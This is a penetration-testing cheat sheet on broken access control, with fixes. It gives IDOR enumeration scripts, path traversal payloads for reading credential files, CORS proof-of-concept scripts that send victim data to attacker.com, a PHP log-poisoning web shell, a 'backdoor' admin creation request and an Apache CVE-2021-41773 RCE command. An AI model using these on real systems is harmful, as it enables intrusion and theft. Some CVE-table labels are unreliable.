# A01: Broken Access Control

OWASP #1 since 2021. 94% of applications tested had some form of broken access control.
CWEs: CWE-200, CWE-201, CWE-352, CWE-284, CWE-285, CWE-639.

---

## Overview

Access control enforces that users cannot act outside their intended permissions.
Failures lead to unauthorized disclosure, modification, destruction of data, or
execution of business functions outside user limits.

**Attack classes covered:**
- IDOR (Insecure Direct Object Reference)
- Path traversal
- CORS misconfiguration
- Privilege escalation (vertical + horizontal)
- Forced browsing / forceful browsing
- BFLA (Broken Function Level Authorization)

---

## Detection Methods

```
# Automated scanners
nuclei -t vulnerabilities/generic/cors-misconfig.yaml -u https://target.com
nuclei -t vulnerabilities/generic/idor.yaml -u https://target.com
nikto -h https://target.com
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

# Manual proxy review (Burp Suite)
# Look for:
# 1. Sequential numeric IDs in parameters: ?id=1234
# 2. User references in URLs: /user/12345/profile
# 3. Object references in cookies/JWTs
# 4. Admin endpoints accessible to normal users
```

---

## What to Look For

**In requests:**
- Numeric or predictable object IDs: `?id=1001`, `/invoice/5523`, `/api/user/42`
- Role/privilege parameters: `?admin=true`, `?role=admin`, `isAdmin=1`
- Direct file references: `?file=report.pdf`, `?path=/home/user/config`
- Function endpoints: `/api/admin/users`, `/api/deleteUser`
- CORS headers: `Access-Control-Allow-Origin: *` on sensitive endpoints

**In responses:**
- Data belonging to other users returned without error
- Admin-only fields returned to regular users
- HTTP 200 on endpoints that should return 403/401
- Different response sizes for valid vs invalid IDs (IDOR oracle)

**In source code:**
- Missing authorization checks before database queries
- Client-side access control only (JS hiding menu items)
- Object retrieval without ownership verification

---

## Testing Methodology

### 1. IDOR Testing
```
# Step 1: Find object references
GET /api/orders/10042
GET /api/documents/5500
GET /profile?userId=1001

# Step 2: Change reference to another user's object
GET /api/orders/10041     # another user's order
GET /api/documents/5499
GET /profile?userId=1000  # admin account is often ID 1

# Step 3: Test all HTTP methods
POST /api/orders/10041    # can I update another user's order?
DELETE /api/orders/10041  # can I delete it?
PUT /api/documents/5499

# Step 4: Test indirect references
# Hash/UUID? Try to enumerate via other endpoints
# E.g., /api/users returns UUIDs that can be used elsewhere
```

### 2. Path Traversal
```
# Linux targets
../../../etc/passwd
....//....//....//etc/passwd     # bypass ../  filter
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   # URL encoded
%252e%252e%252fetc%252fpasswd     # double URL encoded
..%c0%af../etc/passwd             # Unicode / overlong encoding
/var/www/../../etc/passwd         # absolute path variation

# Windows targets
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
%2e%2e%5c%2e%2e%5cwindows%5cwin.ini

# Null byte bypass (PHP < 5.3)
../../../etc/passwd%00.jpg
```

### 3. Privilege Escalation
```
# Step 1: Create two accounts (user A and user B)
# Step 2: Perform admin action as admin, capture request
# Step 3: Replay same request authenticated as normal user

# Common parameters to tamper:
Cookie: role=user  → role=admin
JWT payload: {"role":"user"} → {"role":"admin"}
POST body: {"isAdmin":false} → {"isAdmin":true}
Header: X-User-Role: user → X-User-Role: administrator
```

### 4. CORS Misconfiguration
```
# Test with Burp: add Origin header and check response
Origin: https://attacker.com
Origin: null
Origin: https://target.com.evil.com
Origin: https://evil-target.com

# Vulnerable if response contains:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

# PoC exploit:
<script>
fetch('https://target.com/api/profile', {
  credentials: 'include'
}).then(r => r.text()).then(d => {
  fetch('https://attacker.com/steal?data=' + btoa(d));
});
</script>
```

### 5. Forced Browsing / BFLA
```
# Enumerate admin endpoints
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt

# Common admin paths to try:
/admin
/admin/users
/api/admin
/api/v1/admin
/management
/console
/actuator          # Spring Boot
/actuator/env
/actuator/beans
/server-status     # Apache
/.git/             # git repo exposure
/swagger.json      # API docs
/openapi.json
/api-docs
```

---

## Exploitation Techniques

### IDOR - Data Exfiltration
```python
# Enumerate user data via IDOR
import requests

session = requests.Session()
session.headers['Cookie'] = 'session=YOUR_SESSION'

for user_id in range(1, 1000):
    r = session.get(f'https://target.com/api/user/{user_id}')
    if r.status_code == 200:
        print(f"ID {user_id}: {r.text[:100]}")
```

### IDOR - Account Takeover via Password Reset
```
# Original request (your account):
POST /api/changePassword
{"userId": "1002", "newPassword": "hacked"}

# Modified request (victim account):
POST /api/changePassword
{"userId": "1001", "newPassword": "hacked"}
```

### Path Traversal to RCE (via file inclusion)
```
# Read sensitive files
GET /download?file=../../../etc/passwd
GET /loadTemplate?name=../../../../../../etc/shadow

# Windows: read SAM/system hive
GET /report?path=..\..\..\..\windows\system32\config\SAM

# Combined with LFI for RCE (log poisoning):
# 1. Include PHP in User-Agent:
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# 2. Include the log file via LFI:
GET /view?file=../../../var/log/apache2/access.log&cmd=id
```

### CORS - Credential Theft
```html
<!-- Hosted on attacker.com, triggered by victim visit -->
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  var data = this.responseText;
  // Exfiltrate to attacker's server
  new Image().src = 'https://attacker.com/log?d=' + btoa(data);
};
req.open('GET', 'https://vulnerable-site.com/api/account', true);
req.withCredentials = true;
req.send();
</script>
```

### BFLA - Admin Function Abuse
```
# Regular user accessing admin delete endpoint
DELETE /api/v1/admin/users/1234
Authorization: Bearer USER_JWT_TOKEN

# Or accessing management panel function
POST /admin/createAdminUser
Cookie: session=REGULAR_USER_SESSION
Content-Type: application/json
{"username":"backdoor","password":"p@ss","role":"admin"}
```

---

## Verification

```bash
# Confirm IDOR
curl -H "Cookie: session=USER_A_SESSION" https://target.com/api/user/USER_B_ID
# Should return 403; if 200 with user B data → confirmed IDOR

# Confirm path traversal
curl "https://target.com/download?file=../../../etc/passwd"
# Look for root:x:0:0 in response

# Confirm CORS
curl -H "Origin: https://evil.com" -I https://target.com/api/sensitive
# Check: Access-Control-Allow-Origin: https://evil.com + Allow-Credentials: true

# Confirm privilege escalation
curl -H "Authorization: Bearer NORMAL_USER_TOKEN" https://target.com/api/admin/users
# Should return 403; if 200 → confirmed privilege escalation
```

---

## Common Problems & Solutions

| Problem | Why It Happens | Fix |
|---------|---------------|-----|
| IDOR on numeric IDs | No server-side ownership check | Verify object ownership on every read/write |
| CORS wildcard on sensitive endpoint | Misconfigured CORS policy | Explicit allowlist of trusted origins |
| Path traversal in file download | String concat without sanitization | Use basename(), canonical path validation |
| Admin endpoints no auth | Assumed internal-only, no authz check | Apply authz middleware to ALL routes |
| JWT role tampering | Role read from token without server validation | Store roles server-side, reference session ID only |
| Horizontal priv esc | Missing multi-tenant boundary check | Always filter DB queries by authenticated user ID |

---

## Tools (with Commands)

```bash
# Burp Suite - Intercept and modify requests
# Use Repeater to test IDOR manually
# Use Intruder to enumerate IDs

# FFUF - Directory/endpoint brute forcing
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403

# Nuclei - Automated CORS/access control checks
nuclei -u https://target.com -t exposures/ -t misconfiguration/

# Autorize (Burp plugin) - Automated authz testing
# Capture requests as admin, set low-priv cookie, Autorize replays all requests with low-priv

# PathTraversalScanner
dotdotpwn -m http -h target.com -M GET -o unix

# CORS tester
python3 corscanner.py -u https://target.com -v

# ParamSpider - find hidden parameters
python3 paramspider.py --domain target.com

# Arjun - HTTP parameter discovery
arjun -u https://target.com/api/endpoint
```

---

## Bypass Techniques

### IDOR Bypass
```
# Hash/UUID prediction
# If using MD5(user_id) → rainbow table
# If using sequential UUID v1 → predict timestamp component

# Parameter pollution
GET /api/user?id=1001&id=1002   # Some frameworks take last value

# Mass assignment
POST /api/user/update
{"name":"hacker","role":"admin"}   # if role not filtered server-side

# Encoded references
/api/user/MTAwMQ==    # base64 of "1001" → try base64 of "1000"
```

### Path Traversal Bypass
```
# Filter bypass techniques
..././  instead of ../
....//
..;/         # Tomcat specific
%2e%2e/
%2e%2e%2f
.%2e/
..%2f
%252e%252e%252f   # double encoding
\..\..\  (Windows, when forward slash is blocked)
```

### CORS Bypass
```
# Origin reflection without validation
Origin: https://target.com.attacker.com   # subdomain of trusted
Origin: https://attackertarget.com        # target in attacker domain
Origin: null                               # sandboxed iframe
Origin: https://trusted.com%60.attacker.com  # special chars
```

---

## Remediation

1. **Deny by default** - Every endpoint requires explicit authorization
2. **Server-side enforcement** - Never trust client-side access control
3. **Ownership checks** - `SELECT * FROM orders WHERE id=? AND user_id=?`
4. **Indirect object references** - Map user-facing IDs to internal ones server-side
5. **CORS explicit allowlist** - Never `Access-Control-Allow-Origin: *` with credentials
6. **Disable directory listing** - Prevent forced browsing discovery
7. **Rate limit + log** - Alert on repeated 403s from same IP/account

```python
# Correct ownership check pattern
def get_order(order_id, current_user):
    order = db.query("SELECT * FROM orders WHERE id = ? AND user_id = ?",
                     order_id, current_user.id)
    if not order:
        abort(403)
    return order
```

---

## Real-World CVEs

| CVE | System | Type | Impact |
|-----|--------|------|--------|
| CVE-2019-0232 | Apache Tomcat | Path traversal → RCE | RCE on Windows CGI |
| CVE-2021-41773 | Apache 2.4.49 | Path traversal | File read/RCE |
| CVE-2021-42013 | Apache 2.4.49-50 | Path traversal bypass | RCE |
| CVE-2022-22965 | Spring4Shell | Mass assignment | RCE |
| CVE-2019-11043 | PHP-FPM | Path traversal | RCE |
| 2019 Facebook IDOR | Facebook | IDOR in friend list | ~300M user data |
| 2021 Parler | Parler API | IDOR + sequential IDs | 33TB data scraped |
| 2020 Twitter | Twitter | Privilege escalation | 130 high-profile accounts hijacked |

**Apache CVE-2021-41773 PoC:**
```bash
curl -s --path-as-is "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# With mod_cgi enabled → RCE:
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" \
  "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```
